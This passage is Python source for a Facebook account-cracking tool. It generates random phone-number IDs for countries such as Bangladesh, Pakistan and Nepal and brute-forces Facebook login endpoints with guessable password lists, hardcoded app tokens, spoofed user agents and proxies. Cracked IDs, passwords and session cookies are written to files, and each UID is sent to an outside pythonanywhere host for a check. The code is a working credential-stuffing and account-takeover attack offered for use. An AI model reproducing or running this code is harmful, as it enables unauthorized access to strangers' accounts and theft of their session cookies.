			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			data ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			headers={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={'cookie': koki},headers=headers,allow_redirects=False,proxies=zz)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{O}[{X}JEWEL-CP{O}]{X} '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/XD/CO-M5-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
				cps+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+ids+' | '+pas+'\033[1;97m')
				print(f'\r{O}[\U0001F4A5{O}]{W} '+kuki);print('\033[1;37m')
				open('/sdcard/XD/CO-M5-FILE-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
				oks+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
#-----------------[ RANDOM COUNTRY ]-----------------#
def ___RANDOMX___():
	clear();print(f"{xd1} START BANGLADESH RANDOM CLONING ");print(f"{xd2} START MALAYSIA RANDOM CLONING ");print(f"{xd3} START INDIA RANDOM CLONING ");print(f"{xd4} START NEPAL RANDOM CLONING ");print(f"{xd5} START PAKISTAN RANDOM CLONING ");print(f"{xd6} START AFGHANISTAN RANDOM CLONING ");print(f"{xd7} START NIGERIA RANDOM CLONING ");print(f"{xd8} START UNITED STATES RANDOM CLONING ");print(f"{xd9} START INDONESIA RANDOM CLONING ");linex();random = input(f"{xd} SELECTION {O}:{W} ")
	if random in ["1"]:__po__.append("1");___RANDOM___()
	elif random in ["2"]:__po__.append("2");___RANDOM___()
	elif random in ["3"]:__po__.append("3");___RANDOM___()
	elif random in ["4"]:__po__.append("4");___RANDOM___()
	elif random in ["5"]:__po__.append("5");___RANDOM___()
	elif random in ["6"]:__po__.append("6");___RANDOM___()
	elif random in ["7"]:__po__.append("7");___RANDOM___()
	elif random in ["8"]:__po__.append("8");___RANDOM___()
	elif random in ["9"]:__po__.append("9");___RANDOM___()
	else:linex();print(f"{xd}{R} WRONG OPTION SELECTION ");time.sleep(3);___RANDOMX___()
#-----------------[ RANDOM MENU ]-----------------#
def ___RANDOM___():
	clear()
	if "1" in __po__:print(f"{xd} EXAMPLE {O}:{G} 016 {O}|{G} 017 {O}|{G} 018 {O}|{G} 019 ")
	if "2" in __po__:print(f"{xd} EXAMPLE {O}:{G} 01128 {O}|{G} 011** {O}|{G} 012** ")
	if "3" in __po__:print(f"{xd} EXAMPLE {O}:{G} 6383 {O}|{G} 8795 {O}|{G} 9670 {O}|{G} 9163 ")
	if "4" in __po__:print(f"{xd} EXAMPLE {O}:{G} 9840 {O}|{G} 9861 {O}|{G} 9815 {O}|{G} 9814 ")
	if "5" in __po__:print(f"{xd} EXAMPLE {O}:{G} 0318 {O}|{G} 0306 {O}|{G} 0335 {O}|{G} 0345 ")
	if "6" in __po__:print(f"{xd} EXAMPLE {O}:{G} +9350 {O}|{G} +9330 {O}|{G} +9360 {O}|{G} +9340 ")
	if "7" in __po__:print(f"{xd} EXAMPLE {O}:{G} 070 {O}|{G} 080 {O}|{G} 081 {O}|{G} 091 ")
	if "8" in __po__:print(f"{xd} EXAMPLE {O}:{G} 941 {O}|{G} 816 {O}|{G} 308 {O}|{G} 225 ")
	if "9" in __po__:print(f"{xd} INPUT YOUR INDONESIA COUNTRY SIM CODE ")
	linex();sim = input(f"{xdx} ENTER SIM CODE {O}:{W} ");linex();print(f"{xd} EXAMPLE {O}:{G} 3000 {O}|{G} 5000 {O}|{G} 10000 {O}|{G} 99999 ");linex();limit = int(input(f"{xdx} ENTER LIMIT {O}:{W} "))
	clear();print(f"{xd1} METHOD {W}~{G} M1 ");print(f"{xd2} METHOD {W}~{G} M2 ");print(f"{xd3} METHOD {W}~{G} M3 ");print(f"{xd4} METHOD {W}~{G} M4 ");print(f"{xd5} METHOD {W}~{G} M5 ");linex();methdxdx = input(f'{xd} ENTER METHOD {O}:{W} ')
	for nmbr in range(limit):
		if "1" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(8));user.append(gang)
		if "2" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
		if "3" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
		if "4" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
		if "5" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
		if "6" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
		if "7" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
		if "8" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
		if "9" in __po__:gang = ''.join(random.choice(string.digits) for _ in range(8));user.append(gang)
	clear();__cpshow__ = input(f"{xd} DO YOU WENT SHOW CP UID {O}:{W} ")
	if __cpshow__ in ['y', 'Y', 'yes', 'Yes', '1']:__cp_show__.append('y')
	else:__cp_show__.append('n')
	with tred(max_workers=30) as ___RANDOM___:
		clear();tl = str(len(user))
		if "1" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} BANGLADESH ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "2" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} MALAYSIA ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "3" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} INDIA ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "4" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} NEPAL ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "5" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} PAKISTAN ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "6" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} AFGHANISTAN ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "7" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} NIGERIA ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "8" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} UNITED STATES ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		if "9" in __po__:print(f"{xd} OPERATOR{O}|{G}LIMIT{O}|{G}METHOD {O}:{W} {sim}{O}|{W}{limit}{O}|{W}M{methdxdx} ");print(f"{xd} CLONING COUNTRY {O}:{W} INDONESIA ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		for love in user:
			ids = sim + love
			if "1" in __po__:passlist=[ids,love,ids[5:],ids[4:],ids[3:],ids[:6],ids[:7],ids[:8],ids[2:],ids[1:],ids[9:],ids[10:],ids[11:],ids[12:],ids[13:],ids[14:],ids[15:],ids[16:],ids[17:]]
			if "2" in __po__:passlist=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
			if "3" in __po__:passlist=[ids,love,ids[:6],"57273200","57575751","59039200"]
			if "4" in __po__:passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			if "5" in __po__:passlist=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
			if "6" in __po__:passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
			if "7" in __po__:passlist=[ids,love,ids[:6],"12345","123456","1234","1234567","12345678","123456789"]
			if "8" in __po__:passlist=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
			if "9" in __po__:passlist=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
			if methdxdx in ['1','A']:___RANDOM___.submit(___M1X___,ids,passlist,tl)
			elif methdxdx in ['2','B']:___RANDOM___.submit(___M2X___,ids,passlist,tl)
			elif methdxdx in ['3','C']:___RANDOM___.submit(___M3X___,ids,passlist,tl)
			elif methdxdx in ['4','D']:___RANDOM___.submit(___M4X___,ids,passlist,tl)
			elif methdxdx in ['5','E']:___RANDOM___.submit(___M5X___,ids,passlist,tl)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED ');print(f'{xd} TOTAL OK IDS {O}:{G} {oks}');print(f'{xd} TOTAL CP IDS {O}:{X} {cps}');linex();sys.exit()
#-----------------[ UA-FOR-RANDOM ]-----------------#
def ____useragent____():
	____sexua____ = [
	"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142820;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360M;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
	"[FBAN/FB4A;FBAV/67.0.0.21.154;FBBV/24782425;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
	"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009794;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G3502T;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
	"[FBAN/FB4A;FBAV/66.0.0.33.73;FBBV/23966353;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G313ML;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
	"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142836;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Teletalk;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200F;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"]
	____ua____ = f"[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(1111111,9999999)};{random.choice(____sexua____)}"
	return ____ua____
#-----------------[ RANDOM-M1 ]-----------------#
def ___M1X___(ids,passlist,tl):
        global loop,oks,cps
        sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = (uuid.uuid4()),
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': accessToken, 'generate_session_cookies': '1', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': ____useragent____(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '699'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{O}[{G}JEWEL-OK{O}]{G} {uid} | {pas} ")
                                            print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                            open('/sdcard/XD/CO-M1-RANDOM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                                            oks+=1
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in __cp_show__:print(f"\r{O}[{X}JEWEL-CP{O}]{X} {uid} | {pas} ")
                                        open('/sdcard/XD/CO-M1-RANDOM-CP.txt','a').write(uid+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ RANDOM-M2 ]-----------------#
def ___M2X___(ids,passlist,tl):
        global loop,oks,cps
        sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = (uuid.uuid4()),
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
                        headers = {'User-Agent': ____useragent____(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': f'OAuth {accessToken}', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '353'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{O}[{G}JEWEL-OK{O}]{G} {uid} | {pas} ")
                                            print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                            open('/sdcard/XD/CO-M2-RANDOM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                                            oks+=1
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in __cp_show__:print(f"\r{O}[{X}JEWEL-CP{O}]{X} {uid} | {pas} ")
                                        open('/sdcard/XD/CO-M2-RANDOM-CP.txt','a').write(uid+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ RANDOM-M3 ]-----------------#
def ___M3X___(ids,passlist,tl):
        global loop,oks,cps
        sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = (uuid.uuid4()),
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'logged_out_id': str(uuid.uuid4()), 'hash_id': str(uuid.uuid4()), 'reg_instance': str(uuid.uuid4()), 'session_id': str(uuid.uuid4()), 'advertiser_id': str(uuid.uuid4()), 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'sim_country': 'id', 'network_country': 'id', 'relative_url': 'method/auth.login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
                        headers = {'User-Agent': ____useragent____(),'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': f'OAuth {accessToken}','X-FB-Connection-Type': 'unknown','X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Friendly-Name': 'authenticate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger','Content-Length': '717'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{O}[{G}JEWEL-OK{O}]{G} {uid} | {pas} ")
                                            print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                            open('/sdcard/XD/CO-M3-RANDOM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                                            oks+=1
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in __cp_show__:print(f"\r{O}[{X}JEWEL-CP{O}]{X} {uid} | {pas} ")
                                        open('/sdcard/XD/CO-M3-RANDOM-CP.txt','a').write(uid+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ RANDOM-M4 ]-----------------#
def ___M4X___(ids,passlist,tl):
        global loop,oks,cps
        sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = (uuid.uuid4()),
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent': ____useragent____(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': f'OAuth {accessToken}', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32', 'Content-Length': '607'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{O}[{G}JEWEL-OK{O}]{G} {uid} | {pas} ")
                                            print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                            open('/sdcard/XD/CO-M4-RANDOM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                                            oks+=1
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in __cp_show__:print(f"\r{O}[{X}JEWEL-CP{O}]{X} {uid} | {pas} ")
                                        open('/sdcard/XD/CO-M4-RANDOM-CP.txt','a').write(uid+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ RANDOM-M5 ]-----------------#
def ___M5X___(ids,passlist,tl):
    global loop,oks,cps
    ewe = requests.Session()
    ua = f'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
    sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
    for pas in passlist:
        try:
            xx = open('Proksi.txt','r').read().splitlines()
            zz = {'http': 'socks4://'+random.choice(xx)}
            link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
            data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),"li": re.search('name="li" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search(r'name="jazoest" value="(\d+)"', str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
            headers = {"Host": "touch.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)\.', str(ua)).group(1),re.search(r'Chrome/(\d+)\.', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ____useragent____(),"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = data,headers = headers,allow_redirects = False,proxies = zz)
            if "checkpoint" in ewe.cookies.get_dict():
                uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                if 'y' in __cp_show__:print(f"\r{O}[{X}JEWEL-CP{O}]{X} {uid} | {pas} ")
                open('/sdcard/XD/CO-M5-RANDOM-CP.txt','a').write(uid+'|'+pas+'\n')
                cps+=1
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                if 'LIVE' in response:
                    print(f"\r{O}[{G}JEWEL-OK{O}]{G} {uid} | {pas} ")
                    print(f'\r{O}[\U0001F4A5{O}]{W} '+kuki);print('\033[1;37m')
                    open('/sdcard/XD/CO-M5-RANDOM-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
                    oks+=1
                    break
                else:continue
        except requests.exceptions.ConnectionError:time.sleep(15)
